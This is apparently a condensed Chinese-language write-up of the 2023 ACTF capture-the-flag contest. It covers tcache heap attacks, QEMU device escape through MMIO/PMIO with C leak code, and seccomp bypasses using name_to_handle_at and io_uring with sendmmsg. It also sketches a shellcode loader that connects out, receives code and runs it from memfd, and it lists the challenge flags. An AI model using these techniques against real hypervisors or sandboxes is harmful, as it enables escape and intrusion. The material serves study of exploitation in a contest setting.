---
title: 2023 ACTF writeup by Arr3stY0u
contest: 2023 ACTF
year: 2023
difficulty: insane
vuln_type: [heap_exploit, pwn_unknown, web_unknown, reverse]
tags: [ACTF, QEMU-pwn, qemu-system-x86_64, MMIO, PMIO, iopl, OOB, fpga, PCI-device, BabyNote-tcache, blob-arena, io_uring, sendmmsg, seccomp-bpf, libc-2.23]
attack_chain: ["Q1 BabyNote: tcache dup 任意地址写, tcache_perthread_struct 攻击 → __free_hook = system", "Q2 QEMU pwn: MMIO/PMIO 攻击 qemu-system-x86_64 模拟器, iopl(3) 拿 I/O 权限, leak qemu/elf base, 写 shellcode", "Q3 flashhacker: ACTF{REv3rsE_2_bE_A_fLAshH4cK3r_c001}", "Q4 QEMU seccomp: BPF 沙箱限制 read/write/open, 用 name_to_handle_at/open_by_handle_at 绕过", "Q5 fxxk: io_uring + sendmmsg 走 ORW (open via io_uring_prep_openat + sendmmsg 把 mmap 数据发给 server)", "Q6 memfd + mmap + recv 自写 loader 加载 ELF 反弹"]
key_payload: "leak_u64(heap_base + 0x000e28) - 0xa23d4f = qemu-system-x86_64 base"
one_liner: 2023 ACTF：QEMU 用户态 pwn + io_uring + MMIO/PMIO + 自写 loader
lesson: QEMU 用户态逃逸是 2023+ 高级 pwn；io_uring + sendmmsg 可绕 seccomp；MMIO/PMIO 直接打设备
quality: high
---

# 2023 ACTF writeup by Arr3stY0u

原文 https://www.ctfiot.com/142224.html

## Q1 BabyNote (tcache)
- tcache dup 任意地址写
- `tcache_perthread_struct` 攻击
- `__free_hook = system`

## Q2 QEMU 用户态 pwn
```c
char *mmio_pci_device_name = "/sys/devices/pci0000:00/0000:00:04.0/resource0";
unsigned int pmio_base = 0xc040;
unsigned char *mmio_base;

void mmio_write(uint64_t addr, uint32_t value) { *(uint32_t*)(mmio_base + addr) = value; }
uint32_t mmio_read(uint64_t addr) { return *(uint32_t*)(mmio_base + addr); }

uint64_t leak_u64(uint64_t addr) {
    mmio_write(0x40, addr & 0xFFFFFFFF);
    uint32_t ll = (uint32_t)inl(pmio_base + 0x10);
    mmio_write(0x40, (addr + 4) & 0xFFFFFFFF);
    uint32_t lh = (uint32_t)inl(pmio_base + 0x10);
    return (uint64_t)lh << 32 | ll;
}

int main() {
    mmio_base = get_mem_io_base(mmio_pci_device_name, 0xfebf1000, 0x1000);
    iopl(3);  // 拿 I/O 权限
    // ... 写 MMIO 改 qemu 内部状态 ...
    uint64_t leak_elf = leak_u64(heap_base + 0x000e28) - 0xa23d4f;
    // = qemu-system-x86_64 base
}
```
- ACTF{7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag}

## Q3 flashhacker
- ACTF{REv3rsE_2_bE_A_fLAshH4cK3r_c001}

## Q4 QEMU seccomp BPF
```c
// BPF 限制 read/write/open/sendfile 等
// 但允许 name_to_handle_at / open_by_handle_at
// 通过这两个 syscall 拿 fd → 间接读
// ACTF{D0_u_kNow_7h@T_1o_u3InG_c4n_θrw_ToO0o0OoO?}
```

## Q5 fxxk (io_uring + sendmmsg ORW)
```c
// gcc -o fxxk -static -fno-stack-protector -no-pie -O3 ./fxxk.c -luring
struct io_uring ring;
io_uring_queue_init(16, &ring, 0);
sqe = io_uring_get_sqe(&ring);
io_uring_prep_openat(sqe, AT_FDCWD, "flag", O_RDONLY, 0);
io_uring_submit(&ring);
io_uring_wait_cqe(&ring, &cqe);
// 用 sendmmsg 把 mmap 数据发出去
sendmmsg(4, &msg, 1, 0);
```

## Q6 memfd + mmap + recv 自写 loader
```python
from pwncli import *
file_size = 0x4c5000-0x400000
sc = asm(shellcraft.amd64.linux.syscall('SYS_memfd_create', 'rsp', 7))
sc += asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0x400000, file_size+0x15000, 'PROT_READ | PROT_WRITE | PROT_EXEC', 'MAP_PRIVATE | MAP_ANONYMOUS', 3, 0))
# socket connect + recv shellcode + 跳转
```

## 教学价值
- **QEMU 用户态逃逸** 是 2023+ 高级 pwn
- **MMIO/PMIO 直接攻击** PCI 设备
- **io_uring** 绕 seccomp 是 2024 主流
- **sendmmsg** ORW 经典
- **self-loading ELF** 是高级 loader 技术
- **ACTF** 是 阿里安全办的（AntCTF）

## 工具
- pwntools / pwncli
- iopl / mmap
- io_uring
- QEMU gdb
